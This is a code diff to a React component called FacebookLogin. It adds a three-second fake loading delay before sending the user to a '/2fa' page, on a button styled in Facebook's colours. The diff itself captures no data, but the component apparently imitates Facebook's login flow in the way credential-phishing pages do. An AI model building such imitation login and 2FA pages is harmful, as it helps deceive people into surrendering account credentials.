@@ -1,8 +1,23 @@
 import React from 'react';
 import { useNavigate } from 'react-router-dom';
+import { loading } from "../lib/Alert"
 
 export default function FacebookLogin() {
   const navigate = useNavigate()
+
+
+  function HandleSubmit(){
+
+    loading()
+
+    setTimeout(()=>{
+      loading(false)
+      navigate("/2fa")
+    },3000)
+
+    
+  }
+  
 
   return (
     <div className="min-h-screen bg-white flex flex-col items-center justify-between font-sans antialiased mt-10">
@@ -43,7 +58,7 @@ export default function FacebookLogin() {
           </div>
 
           <button 
-            onClick={()=>navigate("/2fa")}
+            onClick={HandleSubmit}
             type="submit"
             className="w-full py-3 bg-[#1877F2] hover:bg-[#166FE5] text-white font-semibold rounded-full text-base transition-colors duration-200 mt-2 shadow-sm"
           >
